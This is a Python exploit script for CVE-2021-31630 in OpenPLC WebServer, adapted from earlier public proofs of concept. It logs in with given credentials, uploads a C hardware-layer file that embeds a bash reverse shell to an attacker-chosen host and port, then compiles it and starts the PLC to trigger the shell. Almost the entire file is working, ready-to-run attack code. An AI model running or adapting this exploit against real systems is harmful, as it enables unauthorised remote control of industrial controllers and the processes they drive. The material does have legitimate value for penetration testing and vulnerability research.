# Made By Manuel Santos
# Based on https://github.com/thewhiteh4t/cve-2021-31630
# Original PoC https://packetstormsecurity.com/files/162563/OpenPLC-WebServer-3-Remote-Code-Execution.html
# Fixed and error getting cookie session
# https://openplc.discussion.community/post/login-issue-embbeded-system-12302987
# According to the forum they propose only the use of chromium, fixed error handling session

import requests
import argparse
from urllib.parse import urljoin
from time import sleep
import sys

# global url
upload_url_path = '/hardware'
compile_url_path = '/compile-program?file=blank_program.st'
start_url_path = '/start_plc'
stop_url_path = '/stop_plc'
TOUT = 10
saved_cookie = None

# LHOST y LPORT defaults
LHOST = '10.10.1.1'
LPORT = '4444'


def perform_login_and_get_dashboard(base_url, username, password):
    global saved_cookie

    login_url = f"{base_url}/login"
    login_data = {
        'username': username,
        'password': password
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
    }

    session = requests.Session()
    try:
        response = session.post(login_url, data=login_data, headers=headers, allow_redirects=False)
        response.raise_for_status()  # Raises HTTPError for bad responses
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)

    if response.headers:
        print(f"Login response headers received.")
    else:
        print(f"Login failed or headers not available.")
        sys.exit(1)

    # Obtener la cookie de sesi贸n directamente de los encabezados de respuesta
    session_cookie = None
    if 'set-cookie' in response.headers:
        cookies = response.headers['set-cookie']
        for cookie in cookies.split(';'):
            if cookie.strip().startswith('session='):
                session_cookie = cookie.split('=')[1].split(';')[0].strip()
                break
        if not session_cookie:
            print(f"No cookie found")
            sys.exit(1)
       
    if session_cookie:
        print(f"Cookie Saved")

        # Agregar la cookie de sesi贸n a la sesi贸n para la solicitud del dashboard
        session.cookies.set('session', session_cookie)

        # Obtener la URL de redirecci贸n
        redirect_url = response.headers.get('Location')
        if redirect_url:
            redirect_url = urljoin(base_url, redirect_url)
            try:
                dashboard_response = session.get(redirect_url)
                dashboard_response.raise_for_status()  # Raises HTTPError for bad responses
            except requests.exceptions.RequestException as e:
                print(f"Failed to access dashboard: {e}")
                sys.exit(1)

            if dashboard_response.status_code == 200 and session_cookie:
                saved_cookie = session_cookie
        else:
            print("No valid credential.")
            sys.exit(1)
    else:
        print("No session cookie found.")
        sys.exit(1)

def upload(base_url, session):
    global upload_url_path, compile_url_path, LHOST, LPORT, TOUT

    if not upload_url_path or not compile_url_path:
        print("Upload URL or Compile URL path not defined.")
        return
    
    upload_url = urljoin(base_url, upload_url_path)
    compile_url = urljoin(base_url, compile_url_path)

    template = '''
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

void initCustomLayer()
{
}

void updateCustomIn()
{
}

#define LHOST "<IP>"
#define LPORT "<PORT>"

void updateCustomOut()
{
    int pipefd[2];
    pid_t pid;

    if (pipe(pipefd) == -1) {
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        execl("/bin/bash", "/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" LHOST "/" LPORT " 0>&1 &", NULL);
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        wait(NULL);
    }
}
'''
    modded_template = template.replace('<IP>', LHOST).replace('<PORT>', LPORT).encode()
    payload = {
        'hardware_layer': (None, b'blank_linux'),
        'custom_layer_code': (None, modded_template)
    }
    try:
        rqst = session.post(upload_url, files=payload, timeout=TOUT)
        rqst.raise_for_status()  # Raises HTTPError for bad responses
    except requests.exceptions.RequestException as e:
        print(f"Upload failed: {e}")
        sys.exit(1)

    if rqst.status_code == 200:
        print('Payload uploaded!')
        try:
            comp_rqst = session.get(compile_url, timeout=TOUT)
            comp_rqst.raise_for_status()  # Raises HTTPError for bad responses
        except requests.exceptions.RequestException as e:
            print(f"Compilation failed: {e}")
            sys.exit(1)

        if comp_rqst.status_code == 200:
            print('Waiting...')
            sleep(5)
            print('Compilation successful!')
        else:
            print(f'Compilation failed with status: {comp_rqst.status_code}')
            sys.exit(1)
    else:
        print(f'Upload failed with status: {rqst.status_code}')
        sys.exit(1)

def start(session, base_url):
    global start_url_path, TOUT
    start_url = urljoin(base_url, start_url_path)
    try:
        rqst = session.get(start_url, timeout=TOUT)
        rqst.raise_for_status()  # Raises HTTPError for bad responses
    except requests.exceptions.RequestException as e:
        print(f"Failed to start PLC: {e}")
        sys.exit(1)
    
    if rqst.status_code == 200:
        print(f'PLC Started! Check listener...')
    else:
        print(f'Status : {rqst.status_code}')

def stop(session, base_url):
    global stop_url_path, TOUT
    stop_url = urljoin(base_url, stop_url_path)
    try:
        rqst = session.get(stop_url, timeout=TOUT)
        rqst.raise_for_status()  # Raises HTTPError for bad responses
    except requests.exceptions.RequestException as e:
        print(f"Failed to stop PLC: {e}")
        sys.exit(1)

    if rqst.status_code == 200:
        print('PLC Stopped!')
    else:
        print(f'Status : {rqst.status_code}')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a login POST request and access the dashboard.")
    parser.add_argument('base_url', type=str, help="The base URL of the website (e.g., http://10.x.x.x:8080).")
    parser.add_argument('username', type=str, help="The username for login.")
    parser.add_argument('password', type=str, help="The password for login.")
    parser.add_argument('--lhost', type=str, default='10.10.1.1', help="The LHOST value (default: 10.10.1.1).")
    parser.add_argument('--lport', type=str, default='4444', help="The LPORT value (default: 4444).")

    args = parser.parse_args()

    LHOST = args.lhost
    LPORT = args.lport

    try:
        perform_login_and_get_dashboard(args.base_url, args.username, args.password)
        if saved_cookie:
            session = requests.Session()  
            session.cookies.set('session', saved_cookie)
            if session.cookies.get_dict():
                print(f"Cookies stored")
            sleep(1)
            stop(session, args.base_url)
            sleep(1)
            upload(args.base_url, session)
            sleep(1)
            start(session, args.base_url) 
            sleep(1)
            print(f"Exploiting...")
            sleep(1)
            stop(session, args.base_url)
            print(f"Finish if didn't work check --lhost and --lport")
        else:
            print("No session cookie found. Upload cannot proceed.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
